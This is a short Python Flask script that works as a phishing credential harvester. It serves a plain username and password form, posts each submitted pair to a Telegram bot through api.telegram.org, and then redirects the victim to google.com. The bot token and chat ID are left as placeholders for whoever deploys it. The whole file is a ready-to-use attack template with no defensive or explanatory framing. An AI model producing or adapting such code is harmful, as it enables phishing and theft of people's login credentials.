from flask import Flask, request, redirect
import requests
app = Flask(__name__)
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        requests.post('https://api.telegram.org/botYOUR_TOKEN/sendMessage', data={'chat_id': 'YOUR_ID', 'text': f'User: {u}\nPass: {p}'})
        return redirect('https://google.com')
    return '<html><body><form method="POST">User: <input name="u"><br>Pass: <input type="password" name="p"><br><input type="submit"></form></body></html>'
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
